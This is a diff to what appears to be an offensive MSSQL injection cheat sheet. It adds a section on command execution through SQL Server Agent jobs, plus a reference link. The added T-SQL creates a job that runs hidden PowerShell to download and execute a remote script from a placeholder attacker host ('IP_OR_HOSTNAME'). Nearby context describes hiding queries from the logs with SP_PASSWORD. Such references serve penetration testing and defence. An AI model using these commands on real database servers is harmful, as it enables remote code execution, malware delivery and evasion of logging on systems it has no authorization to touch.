@@ -264,6 +264,13 @@ print(sys.version)
 '
 GO
 ```
+## MSSQL Command execution Using Agent Jobs
+```
+USE msdb; 
+EXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; 
+EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(''http://IP_OR_HOSTNAME/file''))"', @retry_attempts = 1, @retry_interval = 5;
+EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1';
+```
 
 ## MSSQL Out of band
 
@@ -389,3 +396,4 @@ Use `SP_PASSWORD` in a query to hide from the logs like : `' AND 1=1--sp_passwor
 * [Microsoft - sys.fn_my_permissions (Transact-SQL)](https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15)
 * [Microsoft - IS_SRVROLEMEMBER (Transact-SQL)](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)
 * [AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice - Marc Olivier Bergeron - Jun 21, 2023](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)
+* https://www.optiv.com/explore-optiv-insights/blog/mssql-agent-jobs-command-execution
